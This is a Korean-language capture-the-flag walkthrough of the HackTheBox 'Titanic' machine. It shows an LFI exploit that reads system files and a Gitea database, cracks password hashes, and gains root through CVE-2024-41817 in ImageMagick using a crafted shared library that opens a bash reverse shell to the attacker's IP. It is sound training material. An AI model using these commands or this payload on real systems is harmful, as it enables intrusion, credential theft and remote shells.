# Titanic - HackTheBox
## Recon
```bash
sudo nmap -p 22,80 -sC -sV -vv -oA titanic 10.10.11.55
```
<img width="1105" height="288" alt="image" src="https://github.com/user-attachments/assets/21760549-31a3-40f6-91b7-56d99599ab96" />

- SSH(22)
- HTTP(80)

---
## HTTP
- `/etc/hosts`에 `titanic.htb`등록.
<img width="1105" height="63" alt="image" src="https://github.com/user-attachments/assets/4a5115da-0fdb-463b-bb6f-b2ede51d1c5f" />

### banner grabbing
```bash
whatweb http://titanic.htb

curl -IL http://titanic.htb
```
<img width="1105" height="266" alt="image" src="https://github.com/user-attachments/assets/ee6b6b96-746c-4712-8622-097941452d91" />

### VHOST
- `dev.titanic.htb`
```bash
ffuf -w ~/util/subdomains.txt -u http://titanic.htb -H 'Host:FUZZ.titanic.htb' -mc all -fs 300-400
```
<img width="1105" height="507" alt="image" src="https://github.com/user-attachments/assets/4ec06f3c-eb71-41e7-ac18-04ac2b434881" />

<br>
<br>

- `/etc/hosts`에 추가.
<img width="1105" height="70" alt="image" src="https://github.com/user-attachments/assets/4be4e97f-0742-49cd-aec6-1e22e70f63a9" />

### Gitea(dev.titanic.htb)
- `docker-config`와 `flask-app` 레포지토리 발견.
<img width="1100" height="171" alt="image" src="https://github.com/user-attachments/assets/6bfaed64-5490-4e73-965d-493dc1fd7533" />

<br>
<br>

- `Gitea`와 `mysql`이 `docker`로 실행되고 있는 것으로 파악됨.
<img width="1100" height="231" alt="image" src="https://github.com/user-attachments/assets/3a325214-fed9-437c-8963-e5f9fd2ffd77" />

### LFI(titanic.htb)
- 서버에서 `Book Now`의 양식을 작성 후 제출하여 `burpsuite`로 가로채서 확인.
- 리다이렉션을 따라가면 작성한 내용을 다운로드.
<img width="1100" height="261" alt="image" src="https://github.com/user-attachments/assets/d4398965-853c-486e-8ce5-ad2a35d403e1" />

<br>
<br>

- `/flask-app/app.py`에서 `/download`를 보면 검증 없이 그대로 파일이 다운로드.(LFI 취약점)
<img width="607" height="257" alt="image" src="https://github.com/user-attachments/assets/e17845dc-ad0c-4656-99a2-b54127b7f0f3" />

<br>
<br>

- `/etc/passwd`에서 `developer`유저 획득.
```bash
curl -s 'http://titanic.htb/download?ticket=/etc/passwd'|grep sh$
```
<img width="1106" height="99" alt="image" src="https://github.com/user-attachments/assets/0259d5cd-5d1a-47c4-9812-e065768bdbab" />

<br>
<br>

- https://docs.gitea.com/installation/install-with-docker
- `gitea` configuration file의 위치 `/data/gitea/conf/app.ini`로 확인.
<img width="1100" height="191" alt="image" src="https://github.com/user-attachments/assets/2575e11b-770f-458a-8d76-827ec96260fd" />

<br>
<br>

- `/docker-config/gitea/docker-compose.yml`에서 `gitea`의 위치 확인.
<img width="569" height="348" alt="image" src="https://github.com/user-attachments/assets/887968cc-d2a3-4c6c-85e2-e53f9c4f5c17" />

<br>
<br>

- `gitea` configuration에서 `gitea.db`파일 위치 확인.
```bash
curl -s 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/conf/app.ini'
```
<img width="1106" height="195" alt="image" src="https://github.com/user-attachments/assets/075a232a-39c9-45cb-a3d2-3b00dc584a9b" />

<br>
<br>

- `gitea.db`다운로드.
```bash
curl 'http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db' -o gitea.db

file gitea.db
```
<img width="1103" height="201" alt="image" src="https://github.com/user-attachments/assets/322fd5ee-6209-478d-8c6d-1cbc9fd52e72" />

<br>
<br>

- `user`테이블에서 계정 정보 노출.
```
sqlite3 gitea.db

sqlite> .headers on

sqlite> .mode column

sqlite> select * from user;
```
<img width="1103" height="536" alt="image" src="https://github.com/user-attachments/assets/31b80bb5-6347-4e34-9cdc-0943cf1eb3be" />

<br>
<br>

- https://hashcat.net/forum/thread-7854.html
- `pbkdf2`알고리즘으로 50000번 횟수로 해시화가 되어 16진수로 저장된 것으로 확인됨.
- `hashcat`으로 크래킹하기 위해서 `"sha256", ":", iterations, ":", base64 salt, ":", base64 digest` 포맷으로 변경이 필요.
<img width="1100" height="173" alt="image" src="https://github.com/user-attachments/assets/ae4b1cb5-d784-4b90-93db-a214c34b77a2" />

<br>
<br>

- `gitea.hashes` 생성.
```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); name=$(echo $data | cut -d'|' -f 3); echo "${name}:sha256:50000:${salt}:${digest}"; done | tee gitea.hashes
```
<img width="1103" height="172" alt="image" src="https://github.com/user-attachments/assets/6c63cc17-d2bd-4668-839a-35ccffaf38af" />

<br>
<br>

- `developer` 비밀번호 획득.
```bash
hashcat hash ~/util/rockyou.txt --user --show
```
<img width="1103" height="238" alt="image" src="https://github.com/user-attachments/assets/c89be4c6-b420-41b8-84ef-e9796f36b72e" />

---
## SSH
- `developer:25282528` 로그인.
```bash
ssh developer@10.10.11.55
```
<img width="1103" height="42" alt="image" src="https://github.com/user-attachments/assets/5e7aeafc-7cc7-4803-9f2b-3b560a82ebf8" />

---
## Privesc
- `/opt/scripts`에 `identify_images.sh`스크립트 발견.
- `/opt/app/static/assets/images`폴더로 이동하여 `jpg`확장자를 찾아서 `magick`을 실행시키는 코드.
<img width="1103" height="81" alt="image" src="https://github.com/user-attachments/assets/e81317ed-e04e-4eb8-b61d-cd13faa25e20" />

<br>
<br>

- `ImageMagick 7.1.1-35`
<img width="1103" height="156" alt="image" src="https://github.com/user-attachments/assets/b0ff4011-9228-45d2-920c-52ba5c98095a" />

### CVE-2024-41817
- https://nvd.nist.gov/vuln/detail/cve-2024-41817
- `AppImage`버전이 `MAGICK_CONFIGURE_PATH`와 `LD_LIBRARY_PATH`를 공란으로 만들어서 현재 폴더에서 configuration 혹은 shared libraries들을 불러오는 취약점.
<img width="1100" height="486" alt="image" src="https://github.com/user-attachments/assets/5cfc7470-8603-4335-8365-00e760d72973" />

<br>
<br>

- https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8
- `xml`파일을 만들어서 실행하는 코드는 실패.
- shared library를 만들어서 `magick`을 실행하면 되는 코드.
<img width="861" height="500" alt="image" src="https://github.com/user-attachments/assets/9e8b3acd-94fe-4db8-9a0a-f3e71537f1cf" />

<br>
<br>

- `cronjobs`로는 해당 스크립트가 주기적으로 실행되고 있는지는 확인할 수 없었다.
- `metadata.log`가 만들어지는 시점을 확인해보니 분단위로 새롭게 작성되는 것처럼 보인다.
<img width="1104" height="233" alt="image" src="https://github.com/user-attachments/assets/890e7635-930f-4232-8ce1-60a484da6723" />

<br>
<br>

- `root`유저로 만들어지고 있기에, 해당 스크립트가 주기적으로 실행된다고 가정하여 해당 폴더에서 exploit 실행.
```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("bash -c 'bash -i >&/dev/tcp/10.10.16.4/80 0>&1'");
    exit(0);
}
EOF
```
<img width="1104" height="193" alt="image" src="https://github.com/user-attachments/assets/d391ebc1-a752-4eec-abfe-84da4852bd8c" />

<br>
<br>

- 셸 획득.
<img width="1104" height="209" alt="image" src="https://github.com/user-attachments/assets/6e4c166b-cddb-42c8-bcea-3ca804e6eb73" />

---
## FLAG
- `/home/develpoer/user.txt`
<img width="1104" height="307" alt="image" src="https://github.com/user-attachments/assets/201aa1dc-a6fd-446e-9998-0ed9dff55044" />

<br>
<br>

- `/root/root.txt`
<img width="1104" height="327" alt="image" src="https://github.com/user-attachments/assets/c373dd6d-43e9-4436-8fdd-64a9e4ac47ce" />















